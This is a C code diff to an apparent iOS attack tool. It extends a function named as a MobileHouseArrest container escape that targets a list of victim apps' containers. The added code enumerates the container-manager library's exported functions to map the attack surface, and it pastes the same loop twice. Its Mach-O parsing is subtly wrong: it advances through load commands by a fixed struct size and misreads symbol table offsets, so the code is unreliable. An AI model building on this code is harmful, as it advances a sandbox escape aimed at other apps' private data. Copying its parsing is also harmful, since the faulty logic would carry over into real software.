@@ -75,10 +75,53 @@ static int can_open(const char *path, int flags)
     return 1;
 }
 
+
+/* Enumerate the MCM client library's exports.
+ *
+ * The library lives in the dyld shared cache, so it is not on disk and its
+ * symbol table cannot be read with a file parser. But the image is loaded
+ * into our process, so we can find it through the dyld image list and
+ * parse its LC_SYMTAB directly. That gives us the whole API surface -
+ * every container_* entry point - instead of guessing which ones exist.
+ */
+#include <mach-o/dyld.h>
+#include <mach-o/loader.h>
+#include <mach-o/nlist.h>
+
+static int mha_dump_mcm_exports(void)
+{
+    uint32_t cnt = _dyld_image_count();
+    for (uint32_t i = 0; i < cnt; i++) {
+        const char *name = _dyld_get_image_name(i);
+        if (!name || !strstr(name, "ontainermanager")) continue;
+        nk_log("[MHA] MCM image: %s", name);
+        const struct mach_header *mh = _dyld_get_image_header(i);
+        if (!mh) continue;
+        struct segment_command_64 *seg = (struct segment_command_64 *)((uintptr_t)mh + sizeof(struct mach_header_64));
+        for (uint32_t s = 0; s < mh->ncmds; s++, seg++) {
+            if (seg->cmd != LC_SYMTAB) continue;
+            struct symtab_command *st = (struct symtab_command *)seg;
+            struct nlist_64 *ns = (struct nlist_64 *)((uintptr_t)mh + st->symoff);
+            uint32_t n = st->nsyms;
+            for (uint32_t k = 0; k < n; k++) {
+                if ((ns[k].n_type & N_TYPE) != N_SECT) continue;
+                if ((ns[k].n_type & N_EXT) == 0) continue;
+                const char *sname = (const char *)((uintptr_t)mh + st->stroff + ns[k].n_un.n_strx);
+                if (strncmp(sname, "container_", 10) != 0) continue;
+                nk_log("[MHA] export: %s", sname);
+            }
+        }
+        return 1;
+    }
+    nk_log("[MHA] MCM image not found in the dyld list");
+    return 0;
+}
+
 void nk_mha_attack(void)
 {
     nk_doc_log_open("mha.log");
     nk_log("[MHA] === MobileHouseArrest container escape ===");
+    mha_dump_mcm_exports();
     /* the identifier IS the authorisation key - it must be
      * "com.apple.mobile.MobileHouseArrest" for MCM to vend anything */
     {
@@ -129,6 +172,33 @@ void nk_mha_attack(void)
         return;
     }
     nk_log("[MHA] all symbols resolved");
+    /* the library is dlopen'd; list everything it exports so we can see
+     * the full API instead of guessing names */
+    {
+        void *cur = (void *)0;
+        /* iterate the dyld images again and dump every symbol of this one */
+        uint32_t cnt = _dyld_image_count();
+        for (uint32_t i = 0; i < cnt; i++) {
+            const char *nm = _dyld_get_image_name(i);
+            if (!nm || !strstr(nm, "ontainermanager")) continue;
+            const struct mach_header *mh = _dyld_get_image_header(i);
+            if (!mh) continue;
+            struct segment_command_64 *sg = (struct segment_command_64 *)((uintptr_t)mh + sizeof(struct mach_header_64));
+            for (uint32_t s = 0; s < mh->ncmds; s++, sg++) {
+                if (sg->cmd != LC_SYMTAB) continue;
+                struct symtab_command *st = (struct symtab_command *)sg;
+                struct nlist_64 *ns = (struct nlist_64 *)((uintptr_t)mh + st->symoff);
+                for (uint32_t k = 0; k < st->nsyms; k++) {
+                    if ((ns[k].n_type & N_TYPE) != N_SECT) continue;
+                    if ((ns[k].n_type & N_EXT) == 0) continue;
+                    const char *sn = (const char *)((uintptr_t)mh + st->stroff + ns[k].n_un.n_strx);
+                    if (strncmp(sn, "container_", 10) != 0) continue;
+                    nk_log("[MHA] api: %s", sn);
+                }
+            }
+        }
+        (void)cur;
+    }
 
     /* --- class 2: the container of another app ------------------------- */
     for (uint32_t v = 0; k_victims[v]; v++) {
